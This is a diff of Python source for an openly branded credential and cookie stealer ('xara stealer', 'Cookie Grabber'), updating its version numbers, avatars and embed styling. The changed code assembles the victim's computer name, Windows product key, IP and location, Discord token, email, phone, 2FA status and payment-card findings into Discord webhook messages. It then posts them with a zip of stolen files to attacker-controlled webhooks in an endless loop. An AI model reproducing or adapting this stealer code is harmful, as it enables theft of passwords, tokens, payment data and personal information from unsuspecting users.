@@ -694,32 +694,31 @@ Antivirus: {avlist}
         
         
         embed = {
-            "username": f"xara stealer | v1.0.0",
+            "username": f"xara stealer | v2.0.0",
             "content": "@everyone",
-            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png",
+            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png",
             "embeds": [
                 {
                     "author": {
                         "name": "xara stealer | strikes again !",
-                        "url": "https://discord.gg/WajMeYnsAa ",
-                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
+                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png"
                     },
-                    "description": f'**__system info__**.\n\n**Computer Name:** {os.getenv("COMPUTERNAME")}\n**{wname}:** {wkey if wkey else "No Product Key!"}\n**IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n**City:** {city}\n**Region:** {region}\n**Country:** {country}\n[Google Maps Location]({googlemap})\n```ansi\n\u001b[32m{self.fileCount}\u001b[35m{self.files}``````ansi\n\u001b[32mStats:\n\u001b[35mPasswords Found: {self.stats["passwords"]}\nCookies Found: {self.stats["cookies"]}\nPhone Numbers Found: {self.stats["phones"]}\nCards Found: {self.stats["cards"]}\nAddresses Found: {self.stats["addresses"]}\nTokens Found: {self.stats["tokens"]}\nTime: {"{:.2f}".format(time.time() - self.starttime)}s```',
+                    "description": f'⭐ **__system info__**. ⭐\n\n💻・**Computer Name:** {os.getenv("COMPUTERNAME")}\n<:win:1053244330611064832>・**{wname}:** {wkey if wkey else "No Product Key!"}\n👀・**IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n🌆・**City:** {city}\n🔎・**Region:** {region}\n🏙・**Country:** {country}\n[Google Maps Location]({googlemap})\n```ansi\n\u001b[32m{self.fileCount}\u001b[35m{self.files}``````ansi\n\u001b[32mStats:\n\u001b[35mPasswords Found: {self.stats["passwords"]}\nCookies Found: {self.stats["cookies"]}\nPhone Numbers Found: {self.stats["phones"]}\nCards Found: {self.stats["cards"]}\nAddresses Found: {self.stats["addresses"]}\nTokens Found: {self.stats["tokens"]}\nTime: {"{:.2f}".format(time.time() - self.starttime)}s```',
                     "color": 0x00000F,
                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                     "thumbnail": {
                       "url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965754587267092/mp4.gif"
                     },
                      "footer": {
-                        "text": "xara stealer | strikes again !",
+                        "text": "GitHub.com/xara-01",
                         "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
                     }
                 }
             ]
         }
         fileEmbed = {
-            "username": f"xara stealer | v1.0.0",
-            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
+            "username": f"xara stealer | v2.0.0",
+            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png"
         }
         with open(_zipfile,'rb') as infozip:
             requests.post(self.webhook, json=embed)
@@ -907,8 +906,6 @@ def get_token():
                     if res.status_code == 200:
                         res_json = res.json()
                         ip = getip()
-                        pc_username = os.getenv("UserName")
-                        pc_name = os.getenv("COMPUTERNAME")
                         user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                         user_id = res_json['id']
                         email = res_json['email']
@@ -918,28 +915,33 @@ def get_token():
                         res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                         nitro_data = res.json()
                         has_nitro = bool(len(nitro_data) > 0)
-                        days_left = 0
+                        pfp=res_json['avatar']
+                        if pfp==None:
+                            pfp='https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png'
+                        else:
+                            pfp=f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}"
+                        
 
 
                         embed = {
-                            "username": f"xara Graber | v1.0.0",
+                            "username": f"xara Graber | v4.0.0",
                             "content": "@everyone",
-                            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png",
+                            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png",
                             "embeds": [
                                 {
                                     "author": {
                                         "name": "xara Graber | strikes again !",
                                         "url": "https://discord.gg/WajMeYnsAa ",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
+                                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png"
                                     },
-                                    "description": f'   🕷   \n <:1119pepesneakyevil:972703371221954630>**・__Username__** ```{user_name} | {user_id}```\n 📧**・__email__** ```{email}```\n 📞**・__Phone Number__** ```{phone}```\n                    <:2fa:1024718014278533212>・**__2FA__**: {mfa_enabled}                                <a:nitroboost:996004213354139658>・**__Nitro__**: {has_nitro}               \n\n**                                                                    🔐・__Tokens__**\n ```{tok}``` \n                                 **__Token Grab Dev by > xara ~$#3123__**\n',
-                                    "color": 0x00000F,
+                                    "description": f'   🕷   \n <a:1441:1038453373239820328>**・__Username__** ```{user_name} | {user_id}```\n<a:uzi:1032752999795265537>**・__ip__** ```{ip}```\n <a:Bat:1032747993981538395>**・__email__** ```{email}```\n <a:dt:1032744237042774057>**・__Phone Number__** ```{phone}```\n              <a:earth:1026630605619855450>・**__2FA__**: {mfa_enabled}                                <a:diamond:1032752566926315575>・**__Nitro__**: {has_nitro}               \n\n**                                            <a:Cc:1032742457416355882>・__Tokens__**\n ```{tok}``` \n',
+                                    "color": 0x070707,
                                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                     "thumbnail": {
-                                      "url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965754587267092/mp4.gif"
+                                      "url": f"{pfp}"
                                     },
                                      "footer": {
-                                        "text": "xara Graber | strikes again !",
+                                        "text": "GitHub.com/xara-01",
                                         "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
                     }
                 }
@@ -948,7 +950,7 @@ def get_token():
 
 
                         fileEmbed = {
-                            "username": f"xara Graber | v1.0.0",
+                            "username": f"xara Graber | v4.0.0",
                             "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
         }
 
@@ -1261,8 +1263,8 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                     zip.write(name_f)
         for URL in DISCORD_WEBHOOK_URLs:
             webhook = DiscordWebhook(url=URL, username='Cookie Grabber - By xara',
-                                     avatar_url="https://cdn.discordapp.com/attachments/965626325803094016/1036196414893608990/darck_pp.png")
-            embed = DiscordEmbed(title='xara-Graber Strike !', color='0x00000F')
+                                     avatar_url="https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png")
+            embed = DiscordEmbed(title='⭐ Cookie Grabber strike ! ⭐', color='0x00000F')
             embed.add_embed_field(
                 name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
             embed.add_embed_field(
@@ -1275,7 +1277,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
             ) else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
             embed.add_embed_field(
                 name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}\n", inline=False)
-            embed.set_footer(text='By xara')
+            embed.set_footer(text='GitHub.com/xara-01', icon_url='https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png')
             embed.set_timestamp()
             with open(os.path.join(td, "data.zip"), 'rb') as f:
                 webhook.add_file(
@@ -1433,3 +1435,4 @@ if __name__ == '__main__':
     init()
     while True:
         main()
+
